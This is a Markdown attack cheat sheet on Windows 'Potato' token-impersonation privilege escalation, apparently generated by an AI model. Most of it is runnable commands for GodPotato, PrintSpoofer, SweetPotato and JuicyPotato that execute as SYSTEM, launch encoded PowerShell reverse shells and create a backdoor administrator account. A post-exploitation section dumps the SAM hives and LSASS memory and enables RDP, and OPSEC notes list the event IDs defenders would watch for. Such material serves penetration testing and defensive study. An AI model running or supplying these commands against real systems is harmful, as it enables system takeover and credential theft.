# Potato Attacks

**Tags:** `#potato` `#privesc` `#seimpersonate` `#windows` `#godpotato` `#sweetpotato` `#juicypotato` `#printspoofer`

Windows privilege escalation via token impersonation. When a service account has `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (common for IIS, MSSQL, and service accounts), Potato exploits trick SYSTEM-level processes into authenticating to an attacker-controlled endpoint, then steal and impersonate the SYSTEM token — escalating from service account to SYSTEM.

**Check first:** `whoami /priv` — look for `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`

> [!note] **Which potato to use** — GodPotato works on Windows Server 2012 - 2022 and Windows 10/11. Use it first. Fall back to PrintSpoofer (Windows 10/Server 2019+) or SweetPotato if GodPotato fails. JuicyPotato only works on Windows ≤ Server 2019 and requires a working CLSID.

---

## Check Privileges

```cmd
:: Check for exploitable privileges
whoami /priv

:: Look for:
:: SeImpersonatePrivilege          Enabled   ← potato attacks
:: SeAssignPrimaryTokenPrivilege   Enabled   ← potato attacks
:: SeDebugPrivilege                Enabled   ← process injection
```

---

## GodPotato (Recommended — Works on Modern Windows)

Supports Windows Server 2012 - 2022, Windows 10 - 11. No CLSID needed.

**Source:** https://github.com/BeichenDream/GodPotato

```cmd
:: Execute command as SYSTEM
GodPotato.exe -cmd "whoami"
GodPotato.exe -cmd "cmd /c whoami"

:: Add local admin
GodPotato.exe -cmd "net user hacker Password123! /add && net localgroup administrators hacker /add"

:: Reverse shell
GodPotato.exe -cmd "powershell -e <BASE64_REVERSESHELL>"

:: Run a binary
GodPotato.exe -cmd "C:\Windows\Temp\shell.exe"
```

---

## PrintSpoofer (Windows 10 / Server 2019+)

Abuses the Print Spooler service to impersonate SYSTEM. Fast and reliable on modern targets.

**Source:** https://github.com/itm4n/PrintSpoofer

```cmd
:: Interactive SYSTEM shell
PrintSpoofer.exe -i -c cmd

:: Execute command
PrintSpoofer.exe -c "whoami"
PrintSpoofer.exe -c "net user hacker Password123! /add && net localgroup administrators hacker /add"

:: Reverse shell
PrintSpoofer.exe -i -c "powershell -e <BASE64_REVERSESHELL>"
```

---

## SweetPotato

Combines multiple potato techniques — DCOM + Print Spooler + token impersonation.

**Source:** https://github.com/CCob/SweetPotato

```cmd
:: Execute command
SweetPotato.exe -e EfsRpc -p C:\Windows\System32\cmd.exe -a "/c whoami"

:: Reverse shell
SweetPotato.exe -e EfsRpc -p C:\Windows\System32\cmd.exe \
  -a "/c powershell -e <BASE64_REVERSESHELL>"

:: Specify exploit method
SweetPotato.exe -e PrintSpoofer -p cmd.exe -a "/c whoami"
SweetPotato.exe -e DCOM -p cmd.exe -a "/c whoami"
```

---

## JuicyPotato (Windows ≤ Server 2019)

Requires a valid CLSID for the target OS. Does NOT work on Server 2019+ (Microsoft patched).

**Source:** https://github.com/ohpe/juicy-potato
**CLSIDs:** https://github.com/ohpe/juicy-potato/tree/master/CLSID

```cmd
:: Find a working CLSID for target OS first (see CLSID list above)

:: Execute command (example CLSID for Windows Server 2016)
JuicyPotato.exe -l 9999 -p C:\Windows\System32\cmd.exe \
  -a "/c net user hacker Password123! /add" \
  -t * -c "{4991d34b-80a1-4291-83b6-3328366b9097}"

:: Reverse shell
JuicyPotato.exe -l 9999 -p C:\Windows\System32\cmd.exe \
  -a "/c powershell -e <BASE64_REVERSESHELL>" \
  -t * -c "{CLSID}"

:: Test with whoami
JuicyPotato.exe -l 9999 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Temp\out.txt" \
  -t * -c "{CLSID}"
type C:\Temp\out.txt
```

---

## Compatibility Matrix

| Tool | Windows Version | Notes |
|---|---|---|
| **GodPotato** | Server 2012 - 2022, Win 10/11 | Best first choice |
| **PrintSpoofer** | Win 10 / Server 2019+ | Requires Print Spooler |
| **SweetPotato** | Win 10 / Server 2016+ | Multiple methods |
| **JuicyPotato** | Win 7 - Server 2016 | Needs CLSID, patched in 2019+ |
| **RoguePotato** | Server 2019 | JuicyPotato alternative for 2019 |

---

## Common Post-Exploitation (After SYSTEM)

```cmd
:: Add admin user
net user hacker Password123! /add
net localgroup administrators hacker /add

:: Dump SAM
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SECURITY C:\Temp\security.save
reg save HKLM\SYSTEM C:\Temp\system.save

:: Enable RDP + add to RDP group
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net localgroup "Remote Desktop Users" hacker /add

:: Dump LSASS
rundll32 C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full
```

---

## OPSEC Notes

- GodPotato / PrintSpoofer execution as SYSTEM generates Event ID **4624** (logon type 5 — service logon)
- Adding users via `net user` generates **4720** (user created) and **4732** (member added to group)
- Service-level execution is expected on service accounts — the privilege escalation itself may not trigger alerts, but post-exploitation actions will

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
